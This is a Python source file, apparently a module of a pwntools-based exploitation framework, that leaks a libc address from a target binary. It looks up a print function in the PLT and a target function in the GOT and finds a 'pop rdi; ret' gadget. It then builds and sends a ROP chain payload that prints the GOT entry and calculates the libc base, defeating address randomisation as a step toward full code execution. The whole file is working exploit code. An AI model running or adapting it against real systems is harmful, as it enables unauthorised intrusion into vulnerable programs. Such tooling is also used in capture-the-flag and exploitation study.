from typing import Optional
from loguru import logger
from abstract.module import AbstractModule
from core.target import Target, Method
from pwn import p64, u64


class GetLibcAddress(AbstractModule):
    DEFAULT_PRINT_FUNCTIONS = ["puts", "printf"]

    @classmethod
    def execute(cls, target: Target, target_function: Optional[str] = None, print_function: Optional[str] = None, *args, **kwargs) -> bool:
        logger.info(f"Running {cls.__name__} module")
        logger.info("Looking for a print function")
        if not print_function:
            print_function = cls.DEFAULT_PRINT_FUNCTIONS
        result = target.look_for_function(print_function, Method.PLT)
        if not result:
            logger.critical(f"Failed to get a print function")
            return False
        print_function_name, print_function_address = result
        if not target_function:
            target_function = print_function_name
        result = target.look_for_function(target_function, Method.GOT)
        if not result:
            logger.critical(f"Failed to find the target function")
            return False
        target_function_name, target_function_address = result
        pop_rdi = target.rop.find_gadget(['pop rdi', 'ret']).address

        rop_chain = (
                p64(pop_rdi) +
                p64(target_function_address) +
                p64(print_function_address) +
                p64(target.main)
        )
        payload = target.create_payload(rop_chain)
        logger.info(f"Sending payload. Payload size = {hex(len(payload))}")
        target.run_main(payload)
        data = target.process.recvline()
        data = data.strip(b'\n')
        if len(data) > 8:
            logger.critical("Unexpected number of bytes received")
            return False
        result = u64(data.ljust(8, b'\0'))
        logger.info(f"Leaked libc address: {print_function_name}@{hex(result)}")
        target.libc.address = result - target.libc.symbols[print_function_name]
        if target.libc.address % 0x100 != 0:
            logger.warning(f"Possible libc version mismatch")
        logger.success(f"libc.base@{hex(target.libc.address)}")
        return True
